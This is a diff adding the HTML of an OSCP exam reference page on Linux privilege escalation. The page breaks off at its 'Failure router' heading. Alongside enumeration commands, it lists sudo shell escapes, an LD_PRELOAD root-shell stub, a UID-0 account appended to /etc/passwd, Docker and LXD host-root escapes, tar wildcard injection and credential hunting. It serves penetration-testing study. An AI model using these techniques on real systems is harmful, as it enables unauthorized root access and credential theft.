@@ -1,0 +1,446 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="generator" content="Astro v7.2.0"><meta name="description" content="Commands, variants, interpretation and next actions for Linux Privilege Escalation."><meta name="theme-color" content="#121414"><link rel="canonical" href="https://armaanleg3nd.github.io/tools/oscp/reference/05-local-privilege-escalation/01-linux-privilege-escalation/"><link rel="icon" href="/favicon.svg" type="image/svg+xml"><meta property="og:title" content="Linux Privilege Escalation | OSCP reference | Armaan"><meta property="og:description" content="Commands, variants, interpretation and next actions for Linux Privilege Escalation."><meta property="og:type" content="website"><meta property="og:url" content="https://armaanleg3nd.github.io/tools/oscp/reference/05-local-privilege-escalation/01-linux-privilege-escalation/"><title>Linux Privilege Escalation | OSCP reference | Armaan</title><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="swap"><script type="module" src="/_assets/ClientRouter.astro_astro_type_script_index_0_lang.xc6nT38P.js"></script><link rel="stylesheet" href="/_assets/BaseLayout.C8rLAhpp.css"><link rel="stylesheet" href="/_assets/ToolLayout.Bh0Ez8ox.css"><style>.full-reference{max-width:1420px;color:var(--text);margin:auto;padding:2rem clamp(1rem,4vw,4rem) 5rem}.full-reference a{color:var(--cyan-soft)}.full-reference h1{margin:1.25rem 0;font-size:clamp(1.7rem,3vw,2.5rem);line-height:1.2}.full-reference p{color:var(--muted);max-width:80ch;line-height:1.8}.reference-find{gap:.6rem;max-width:44rem;margin:1.5rem 0;font-size:.85rem;display:grid}.reference-find input{border:1px solid var(--line-strong);background:var(--surface-low);color:var(--text);border-radius:3px;padding:.8rem}.reference-index{grid-template-columns:repeat(2,minmax(0,1fr));gap:2rem;display:grid}.reference-index section{min-width:0}.reference-index h2{text-transform:capitalize;border-bottom:1px solid var(--line);padding-bottom:.7rem;font-size:1.2rem}.reference-index h3{margin:1.3rem 0 .5rem;font-size:1rem}.reference-index ul{padding-left:1.2rem;font-size:.84rem;line-height:1.9}.reference-index .level-3{color:var(--muted);margin-left:1rem;font-size:.76rem}.reference-index [hidden]{display:none}.reference-reading{grid-template-columns:240px minmax(0,1fr);gap:2.5rem;display:grid}.reference-reading nav{top:calc(var(--header-height) + 1rem);max-height:calc(100dvh - var(--header-height) - 2rem);border-right:1px solid var(--line);align-self:start;padding:1rem;font-size:.76rem;position:sticky;overflow:auto}.reference-reading nav ul{padding:0;list-style:none}.reference-reading nav li{margin:.7rem 0;line-height:1.5}.reference-reading nav .level-3{padding-left:1rem;font-size:.7rem}.reference-prose{min-width:0;line-height:1.85}.reference-prose :is(h1,h2,h3,h4){scroll-margin-top:calc(var(--header-height) + 1.5rem);margin:2rem 0 1rem;line-height:1.35}.reference-prose h2{border-top:1px solid var(--line);padding-top:1.5rem;font-size:1.35rem}.reference-prose h3{font-size:1.05rem}.reference-prose pre{border:1px solid var(--line);background:var(--surface-low);max-width:100%;font:.8rem/1.75 var(--mono);border-radius:3px;padding:2.5rem 1rem 1rem;position:relative;overflow:auto}.reference-prose [data-reference-copy]{border:1px solid var(--line);color:var(--cyan-soft);font:.65rem var(--mono);cursor:pointer;background:0 0;padding:.2rem .5rem;position:absolute;top:.4rem;right:.5rem}.reference-prose code{overflow-wrap:anywhere;font-size:.85em}.reference-prose pre code{overflow-wrap:normal;font-size:inherit}.reference-prose blockquote{border-left:2px solid var(--cyan);color:var(--muted);margin:1.25rem 0;padding-left:1rem}.reference-prose table{border-collapse:collapse;max-width:100%;font-size:.8rem;display:block;overflow:auto}.reference-prose :is(td,th){border:1px solid var(--line);text-align:left;padding:.6rem}.reference-prose img{max-width:100%;height:auto}.reference-prose details{border-top:1px solid var(--line);padding:.8rem 0}.reference-prose summary{cursor:pointer;color:var(--cyan-soft)}@media (width<=850px){.reference-index,.reference-reading{grid-template-columns:1fr}.reference-reading nav{border:1px solid var(--line);max-height:18rem;position:static}.full-reference{padding-top:1rem}}
+</style><style>[data-astro-transition-scope="astro-nfpogox7-1"] { view-transition-name: page-content; }@layer astro { ::view-transition-old(page-content) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }::view-transition-new(page-content) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(page-content) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(page-content) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-nfpogox7-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-nfpogox7-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-nfpogox7-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-nfpogox7-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }</style></head><body><a class="skip-link" href="#main-content">Skip to content</a><header class="site-header" data-astro-cid-wpvy4v7s><nav class="site-nav" aria-label="Primary navigation" data-astro-cid-wpvy4v7s><a class="brand" href="/" aria-label="leg3nd home" data-astro-cid-wpvy4v7s><span data-astro-cid-wpvy4v7s>leg3nd</span><small data-astro-cid-wpvy4v7s>Projects &amp; tools</small></a><button class="nav-toggle" type="button" aria-expanded="false" aria-controls="nav-links" data-astro-cid-wpvy4v7s><span data-astro-cid-wpvy4v7s>MENU</span><span class="nav-toggle__glyph" aria-hidden="true" data-astro-cid-wpvy4v7s>[+]</span></button><div class="nav-links" id="nav-links" data-astro-cid-wpvy4v7s><a href="/" data-astro-cid-wpvy4v7s><span class="nav-index" data-astro-cid-wpvy4v7s>01</span>Home</a><a href="/projects/" data-astro-cid-wpvy4v7s><span class="nav-index" data-astro-cid-wpvy4v7s>02</span>Projects</a><a href="/tools/" class="active" aria-current="page" data-astro-cid-wpvy4v7s><span class="nav-index" data-astro-cid-wpvy4v7s>03</span>Tools</a></div><div class="system-state" aria-label="Timezone" data-astro-cid-wpvy4v7s>GMT+8</div></nav></header><script type="module">var e=()=>{let e=document.querySelector(`.nav-toggle`),t=document.querySelector(`.nav-links`);if(!e||!t||e.dataset.bound===`true`)return;e.dataset.bound=`true`;let n=()=>{e.setAttribute(`aria-expanded`,`false`),t.dataset.open=`false`;let n=e.querySelector(`.nav-toggle__glyph`);n&&(n.textContent=`[+]`)};e.addEventListener(`click`,()=>{let n=e.getAttribute(`aria-expanded`)===`true`;e.setAttribute(`aria-expanded`,String(!n)),t.dataset.open=String(!n);let r=e.querySelector(`.nav-toggle__glyph`);r&&(r.textContent=n?`[+]`:`[-]`)}),t.addEventListener(`click`,e=>{e.target.closest(`a`)&&n()}),e.closest(`nav`)?.addEventListener(`keydown`,t=>{t.key===`Escape`&&(n(),e.focus())})};document.addEventListener(`astro:page-load`,e),e();</script><div data-astro-transition-scope="astro-nfpogox7-1" id="main-content"><div class="tools-surface"><main class="full-reference"><p><a href="/tools/oscp/reference/">← Complete task index</a> · <a href="/tools/oscp/">Workspace</a></p><div class="reference-reading"><nav aria-label="On this page"><strong>On this page</strong><ul><li class="level-2"><a href="#1-establish-current-state">1. Establish current state</a></li><li class="level-2"><a href="#2-prove-permissions-including-parents-and-mounts">2. Prove permissions, including parents and mounts</a></li><li class="level-2"><a href="#3-hunt-credentials-and-service-trails">3. Hunt credentials and service trails</a></li><li class="level-2"><a href="#4-sudo-parse-the-complete-rule">4. Sudo: parse the complete rule</a></li><li class="level-2"><a href="#5-suid-sgid-and-capabilities">5. SUID, SGID and capabilities</a></li><li class="level-2"><a href="#6-cron-timers-and-services">6. Cron, timers and services</a></li><li class="level-2"><a href="#7-path-and-relative-command-hijacking">7. PATH and relative-command hijacking</a></li><li class="level-2"><a href="#8-wildcard-and-option-injection">8. Wildcard and option injection</a></li><li class="level-2"><a href="#9-writable-accountpolicy-files">9. Writable account/policy files</a></li><li class="level-2"><a href="#10-privileged-groups-sockets-and-containers">10. Privileged groups, sockets and containers</a></li><li class="level-2"><a href="#11-mounts-nfs-and-local-services">11. Mounts, NFS and local services</a></li><li class="level-2"><a href="#12-shared-library-resolution">12. Shared-library resolution</a></li><li class="level-2"><a href="#13-softwarekernel-exploits-evidence-last">13. Software/kernel exploits: evidence last</a></li><li class="level-2"><a href="#14-automated-enumeration-generate-then-prove">14. Automated enumeration: generate, then prove</a></li><li class="level-2"><a href="#15-failure-router">15. Failure router</a></li><li class="level-2"><a href="#16-verify-and-re-enumerate">16. Verify and re-enumerate</a></li><li class="level-2"><a href="#restricted-shell--escape-the-restriction-without-claiming-root">Restricted shell — escape the restriction without claiming root</a></li><li class="level-2"><a href="#kernel-candidates--linux-exploit-suggester-as-a-second-view">Kernel candidates — Linux Exploit Suggester as a second view</a></li><li class="level-2"><a href="#logrotate-race--only-with-a-controlled-log-path-and-privileged-rotation">Logrotate race — only with a controlled log path and privileged rotation</a></li><li class="level-2"><a href="#sources">Sources</a></li></ul></nav><article class="reference-prose"><h1 id="linux-privilege-escalation">Linux Privilege Escalation</h1>
+<p><a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/05-local-privilege-escalation/README.md">← Stage index</a> | <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/cheatsheets/linux-privesc.md">Quick sheet</a> | <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/notes/Master_Notes.md#linux-selection-logic">Master Notes</a> | <a href="/tools/oscp/reference/04-shells-transfers-credentials/01-file-transfer/">File transfer</a> | <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/notes/Attack_Strategy_Map.md">Strategy map</a> | Study methods: <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/notes/methods/linux-privesc.md">Escalate privileges on Linux</a></p>
+<blockquote>
+<p><strong>Model:</strong> controlled object → effective permission → privileged consumer → execution identity → trigger → effect → verified identity.</p>
+</blockquote>
+<blockquote>
+<p><strong>First pass:</strong> confirm the session identity, run the <a href="#14-automated-enumeration-generate-then-prove">LinPEAS baseline</a> early, then verify its exact finding. For short-lived scheduled commands use <a href="#6-cron-timers-and-services">pspy</a> and inspect the consumed path.</p>
+</blockquote>
+<h2 id="1-establish-current-state">1. Establish current state</h2>
+<blockquote>
+<p><strong>Decisive output:</strong> current identity/groups, OS/kernel/architecture, network position, root-owned activity, mounts and exact sudo rules.</p>
+</blockquote>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">hostname; id; groups
+uname -a; cat /etc/os-release; getconf LONG_BIT
+pwd; umask; env
+ip addr; ip route; ss -lntup; ss -lxnp
+ps auxf
+mount; findmnt; lsblk; df -hT
+sudo -n -l 2>&#x26;1
+sudo -l
+</code></pre>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">getent passwd
+awk -F: '$3 == 0 || $7 !~ /(nologin|false)$/ {print $1,$3,$4,$6,$7}' /etc/passwd
+</code></pre>
+<blockquote>
+<p><strong>Priority:</strong> credentials/sudo → root-consumed writable objects → SUID/capabilities → privileged groups/mounts/local services → PATH/libraries/wildcards → software/kernel.</p>
+</blockquote>
+<h2 id="2-prove-permissions-including-parents-and-mounts">2. Prove permissions, including parents and mounts</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">namei -l /PATH/TO/OBJECT
+stat /PATH/TO/OBJECT /PATH/TO/PARENT
+getfacl -p /PATH/TO/OBJECT /PATH/TO/PARENT 2>/dev/null
+findmnt -T /PATH/TO/OBJECT -o TARGET,SOURCE,FSTYPE,OPTIONS
+</code></pre>
+<blockquote>
+<p>Directory write+execute can permit replacement even when the file is not writable. ACLs can add/remove effective access. <code>nosuid</code> defeats SUID/SGID and file-capability effects; <code>noexec</code> blocks direct execution; <code>ro</code> blocks changes.</p>
+</blockquote>
+<p>Discover writable objects, then prioritize root-owned configuration, scripts, binaries and parents under <code>/etc</code>, <code>/opt</code>, <code>/usr/local</code>, application paths and service working directories:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">find / -xdev -type f -writable -ls 2>/dev/null
+find / -xdev -type d -writable -ls 2>/dev/null
+</code></pre>
+<h2 id="3-hunt-credentials-and-service-trails">3. Hunt credentials and service trails</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">history 2>/dev/null
+find /home /root -maxdepth 3 -type f \
+  \( -name '.*history' -o -name '*.conf' -o -name '*.ini' -o -name '*.env' \
+     -o -name 'id_*' -o -name '*.pem' -o -name '*.key' -o -name '*.bak' \) \
+  -readable 2>/dev/null
+
+grep -RniE 'pass(word)?|secret|token|api[_-]?key|connection(string)?' \
+  /var/www /opt /srv /etc 2>/dev/null | head -n 200
+</code></pre>
+<p>Inspect process arguments and readable process environment:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">ps auxww
+ps eww -u root 2>/dev/null
+tr '\0' ' ' &#x3C; /proc/PID/cmdline 2>/dev/null; echo
+tr '\0' '\n' &#x3C; /proc/PID/environ 2>/dev/null
+</code></pre>
+<p>Check reusable local sessions/agents only when their sockets are accessible:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">w; who; last -n 20
+env | grep -E 'SSH_AUTH_SOCK|TMUX|STY'
+tmux ls 2>/dev/null
+screen -ls 2>/dev/null
+find /tmp /run -maxdepth 3 -type s -ls 2>/dev/null
+</code></pre>
+<blockquote>
+<p>An agent, tmux/screen or daemon socket needs effective socket access and a useful authenticated/privileged session. Presence alone is not session hijacking.</p>
+</blockquote>
+<blockquote>
+<p><strong>Next:</strong> identify the value's user/service context, validate the smallest relevant transition (<code>su</code>, <code>sudo</code>, SSH or application authentication), then re-enumerate. Use <a href="/tools/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/">credential handling</a> for cracking/reuse.</p>
+</blockquote>
+<h2 id="4-sudo-parse-the-complete-rule">4. Sudo: parse the complete rule</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">sudo -n -l 2>&#x26;1
+sudo -l
+sudo --version
+</code></pre>
+<p>Record the run-as identity, password tag, executable path, argument constraints/wildcards and <code>SETENV</code>/<code>NOSETENV</code>/<code>env_keep</code>/<code>secure_path</code>/<code>NOEXEC</code>. Match the exact mode under <a href="https://gtfobins.github.io/">GTFOBins</a>.</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">sudo /usr/bin/find . -exec /bin/sh \; -quit
+sudo /usr/bin/awk 'BEGIN {system("/bin/sh")}'
+sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh","-p")'
+</code></pre>
+<blockquote>
+<p>Use an example only when the entire rule permits it. Restricted arguments, another path/build, privilege dropping, <code>NOEXEC</code>, a non-root run-as user or MAC policy can invalidate the escape.</p>
+</blockquote>
+<details>
+<summary><strong>Preserved LD_PRELOAD variant</strong></summary>
+<blockquote>
+<p>Requires an explicitly allowed/preserved variable and a dynamically linked allowed program.</p>
+</blockquote>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">sudo -l | grep -E 'SETENV|env_keep.*LD_PRELOAD'
+</code></pre>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-c">#include &#x3C;stdlib.h>
+#include &#x3C;unistd.h>
+void _init(void) {
+  unsetenv("LD_PRELOAD");
+  setgid(0); setuid(0);
+  system("/bin/sh");
+}
+</code></pre>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">gcc -fPIC -shared -nostartfiles -o /tmp/preload.so preload.c
+sudo LD_PRELOAD=/tmp/preload.so /ALLOWED/PROGRAM
+</code></pre>
+<blockquote>
+<p>Static linking, secure-loader behavior, missing environment permission or MAC denial disproves this route.</p>
+</blockquote>
+</details>
+<h2 id="5-suid-sgid-and-capabilities">5. SUID, SGID and capabilities</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">find / -xdev -type f -perm -4000 -ls 2>/dev/null
+find / -xdev -type f -perm -2000 -ls 2>/dev/null
+getcap -r / 2>/dev/null
+</code></pre>
+<p>Rank nonstandard/custom paths, unexpected versions, writable binaries/parents and dangerous interpreters. Inspect one candidate:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">namei -l /PATH/TO/BINARY
+stat /PATH/TO/BINARY
+file /PATH/TO/BINARY
+readelf -d /PATH/TO/BINARY 2>/dev/null | grep -E 'RPATH|RUNPATH|NEEDED'
+ldd /PATH/TO/BINARY 2>/dev/null
+strings /PATH/TO/BINARY | head -n 150
+dpkg -S /PATH/TO/BINARY 2>/dev/null
+rpm -qf /PATH/TO/BINARY 2>/dev/null
+</code></pre>
+<blockquote>
+<p>Look for a documented SUID/capability primitive, unsafe relative helper, arbitrary file operation, user-controlled config/plugin or exact vulnerable version. Normal distribution SUID files are not findings by themselves.</p>
+</blockquote>
+<details>
+<summary><strong>Capability interpretation and example</strong></summary>
+<p>High-value capability candidates include <code>cap_setuid</code>, <code>cap_setgid</code>, <code>cap_dac_override</code>, <code>cap_dac_read_search</code>, <code>cap_sys_ptrace</code>, <code>cap_sys_admin</code>, <code>cap_setfcap</code> and <code>cap_sys_module</code>. <code>cap_net_raw</code> is usually not a direct root transition.</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">capsh --print 2>/dev/null
+grep '^Cap' /proc/self/status
+</code></pre>
+<p>Only when the exact interpreter has effective <code>cap_setuid</code>:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">/PATH/TO/python3 -c 'import os; os.setuid(0); os.execl("/bin/sh","sh","-p")'
+</code></pre>
+<blockquote>
+<p><code>+ep</code> indicates permitted plus the file effective bit. Bounding sets, namespaces, <code>nosuid</code> mounts and program behavior can still change the result.</p>
+</blockquote>
+</details>
+<h2 id="6-cron-timers-and-services">6. Cron, timers and services</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">crontab -l 2>/dev/null
+cat /etc/crontab
+cat /etc/anacrontab 2>/dev/null
+atq 2>/dev/null
+ls -la /etc/cron.* /var/spool/cron 2>/dev/null
+grep -RniE 'CRON|CMD' /var/log/syslog /var/log/cron* 2>/dev/null | tail -n 100
+
+systemctl list-timers --all
+systemctl list-unit-files --type=service
+systemctl list-units --type=service --state=running
+systemctl cat UNIT
+systemctl show UNIT -p User -p Group -p ExecStart -p WorkingDirectory -p EnvironmentFiles
+</code></pre>
+<p>Observe short-lived commands:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">./pspy64
+./pspy64 -pf -i 1000
+</code></pre>
+<p>Validate every referenced script, binary, configuration, environment file, plugin and parent:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">namei -l /PATH/TO/OBJECT
+stat /PATH/TO/OBJECT /PATH/TO/PARENT
+getfacl -p /PATH/TO/OBJECT /PATH/TO/PARENT 2>/dev/null
+</code></pre>
+<blockquote>
+<p><strong>Prove:</strong> exact object is controllable → job/service consumes it → process runs as a higher identity → schedule/restart/other trigger is available. A writable unit still needs a privileged reload/restart or automatic trigger. Cron uses a different/minimal environment.</p>
+</blockquote>
+<p>Apply the same proof to backup, logrotate, package-maintenance and custom housekeeping hooks: configuration visibility or a writable output is insufficient unless a higher-privileged consumer interprets attacker-controlled input.</p>
+<h2 id="7-path-and-relative-command-hijacking">7. PATH and relative-command hijacking</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">echo "$PATH" | tr ':' '\n'
+echo "$PATH" | tr ':' '\n' | while IFS= read -r d; do
+  [ -z "$d" ] &#x26;&#x26; d=.
+  [ -w "$d" ] &#x26;&#x26; ls -ld "$d"
+done
+strings /PATH/TO/PRIVILEGED_BINARY | grep -E '(^|[^/])(cp|tar|service|sh|bash|cat)( |$)'
+</code></pre>
+<p>If the privileged consumer resolves <code>helper</code> through a controllable PATH:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">printf '#!/bin/sh\n/usr/bin/id > /tmp/path-proof\n' > /WRITABLE/DIR/helper
+chmod 700 /WRITABLE/DIR/helper
+PATH=/WRITABLE/DIR:$PATH /PATH/TO/TRIGGER
+cat /tmp/path-proof
+</code></pre>
+<blockquote>
+<p>Requires a relative command, the consumer's effective PATH, an earlier writable directory, trigger and retained privilege. Your interactive PATH alone is inconclusive.</p>
+</blockquote>
+<h2 id="8-wildcard-and-option-injection">8. Wildcard and option injection</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">grep -RniE 'tar .+\*|chown .+\*|chmod .+\*|rsync .+\*' \
+  /etc/cron* /etc/systemd /opt /usr/local 2>/dev/null
+</code></pre>
+<p>GNU tar proof, only when a privileged job executes compatible <code>tar ... *</code> in an attacker-writable directory:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">printf '#!/bin/sh\n/usr/bin/id > /tmp/wildcard-proof\n' > proof.sh
+chmod 700 proof.sh
+touch -- '--checkpoint=1'
+touch -- '--checkpoint-action=exec=sh proof.sh'
+</code></pre>
+<blockquote>
+<p>Confirm working directory, wildcard placement, utility implementation/options, privileged identity and trigger. Do not assume every wildcard or utility accepts filename-derived options.</p>
+</blockquote>
+<h2 id="9-writable-accountpolicy-files">9. Writable account/policy files</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">ls -l /etc/passwd /etc/shadow /etc/sudoers
+namei -l /etc/passwd
+getfacl -p /etc/passwd 2>/dev/null
+</code></pre>
+<details>
+<summary><strong>Writable /etc/passwd — authorized disposable lab only</strong></summary>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">cp /etc/passwd /tmp/passwd.backup
+HASH=$(openssl passwd -6 'TEMP_PASSWORD')
+printf 'root2:%s:0:0:root:/root:/bin/bash\n' "$HASH" >> /etc/passwd
+su - root2
+id
+</code></pre>
+<blockquote>
+<p>Preserve a known-good copy and restore it. UID/GID 0 creates a superuser. Do not risk corrupting a host when no safe recovery exists.</p>
+</blockquote>
+</details>
+<p>Also inspect effective access to <code>/etc/sudoers.d</code>, PAM, SSH authorized-key locations and root-executed startup/configuration files.</p>
+<h2 id="10-privileged-groups-sockets-and-containers">10. Privileged groups, sockets and containers</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">id
+ls -l /var/run/docker.sock /run/docker.sock 2>/dev/null
+docker version 2>/dev/null
+lxc list 2>/dev/null
+</code></pre>
+<p>Group candidates include <code>docker</code>, <code>lxd</code>/<code>lxc</code>, <code>disk</code>, <code>shadow</code>, <code>adm</code>, <code>systemd-journal</code> and <code>libvirt</code>. Prove the associated resource and effective permission.</p>
+<details>
+<summary><strong>Rootful Docker daemon with an available image</strong></summary>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">docker images
+docker run --rm -it -v /:/host IMAGE chroot /host /bin/sh
+</code></pre>
+<blockquote>
+<p>Requires daemon/socket access, a rootful daemon, usable image and allowed host bind mount. Rootless mode, user namespaces, authorization plugins and SELinux can change the effect.</p>
+</blockquote>
+</details>
+<details>
+<summary><strong>LXD/LXC with an available image alias</strong></summary>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">lxc image list
+lxc init IMAGE_ALIAS privesc -c security.privileged=true
+lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
+lxc start privesc
+lxc exec privesc /bin/sh
+</code></pre>
+<blockquote>
+<p>Requires configured daemon access, sufficient group rights, image availability and privileged-container/device support.</p>
+</blockquote>
+</details>
+<h2 id="11-mounts-nfs-and-local-services">11. Mounts, NFS and local services</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">findmnt
+cat /etc/fstab
+mount
+ss -lntup
+ss -lxnp
+</code></pre>
+<p>For NFS, a writable export plus <code>no_root_squash</code> can trust client-root-created ownership/SUID metadata. Confirm export options, writable mount, target-side mount options and compatible execution. See <a href="/tools/oscp/reference/02-service-enumeration/05-nfs-rpc/">NFS/RPC</a>.</p>
+<p>Root-only loopback services and UNIX sockets are candidates only. Identify protocol/authentication and prove a privileged action through a controlled request, configuration, plugin or file.</p>
+<h2 id="12-shared-library-resolution">12. Shared-library resolution</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">file /PATH/TO/BINARY
+readelf -d /PATH/TO/BINARY 2>/dev/null | grep -E 'RPATH|RUNPATH|NEEDED'
+ldd /PATH/TO/BINARY 2>/dev/null
+</code></pre>
+<blockquote>
+<p>Need a privileged dynamically linked consumer plus a missing/selected library resolved from a writable location or a preserved loader variable. Secure-execution mode strips many loader variables from SUID/SGID programs. Prefer <code>readelf</code> over executing an untrusted file through an unsafe <code>ldd</code> implementation.</p>
+</blockquote>
+<p>For root-run scripts, inspect imports/includes and their actual search order. A writable current directory, module path or imported file can be a privileged input even when the main script is protected:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">grep -nE '^(import|from) |require\(|include|source |\. ' /PATH/TO/SCRIPT
+/PATH/TO/python3 -c 'import sys; print("\n".join(sys.path))'
+</code></pre>
+<blockquote>
+<p>Prove the privileged interpreter uses the writable module/include before changing it. The interactive interpreter's search path may differ from cron/systemd/sudo.</p>
+</blockquote>
+<h2 id="13-softwarekernel-exploits-evidence-last">13. Software/kernel exploits: evidence last</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">uname -a
+cat /proc/version
+cat /etc/os-release
+dpkg -l 2>/dev/null
+rpm -qa 2>/dev/null
+sudo --version
+lsmod
+sysctl kernel.unprivileged_userns_clone 2>/dev/null
+</code></pre>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">searchsploit "PRODUCT VERSION local privilege escalation"
+searchsploit -x EDB_ID
+searchsploit -m EDB_ID
+gcc -Wall -Wextra exploit.c -o exploit
+file exploit
+sha256sum exploit
+</code></pre>
+<blockquote>
+<p>Match component, exact distribution/build and patch/backport state, architecture, required configuration/capabilities/namespaces, mitigations and dependencies. Review source and recovery risk. A version title or successful compilation is only a candidate. Follow <a href="/tools/oscp/reference/03-initial-access/06-public-exploit-adaptation/">public exploit adaptation</a>.</p>
+</blockquote>
+<h2 id="14-automated-enumeration-generate-then-prove">14. Automated enumeration: generate, then prove</h2>
+<p>For the early collector pass, transfer a reviewed LinPEAS copy, check the current UID/architecture and save its output. This form does not require an executable bit:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">sh ./linpeas.sh | tee linpeas.txt
+</code></pre>
+<p>Follow the named finding into the matching sudo, SUID/capability, writable-consumer or credential procedure. Use the local help for optional modes; broader/noisier checks are not the automatic baseline.</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">./linpeas.sh | tee linpeas.txt
+./lse.sh | tee lse.txt
+./lse.sh -l1 | tee lse-l1.txt
+./unix-privesc-check standard > unix-privesc-check.txt
+</code></pre>
+<blockquote>
+<p>LinPEAS optional flags vary by build. Read the local <code>./linpeas.sh -h</code> before selecting broader checks; they are not the automatic baseline. LSE progresses from default to <code>-l1</code>, then <code>-l2</code> only if needed. <code>unix-privesc-check detailed</code> is slower and more false-positive-prone.</p>
+</blockquote>
+<p>For every highlight:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">exact object | effective permission | privileged consumer | identity | trigger | expected effect | manual verification
+</code></pre>
+<p>Do not pipe an unverified Internet download into the target shell. Acquire a trusted copy, retain its source/hash, transfer deliberately and remove assessment artifacts when appropriate.</p>
+<h2 id="15-failure-router">15. Failure router</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
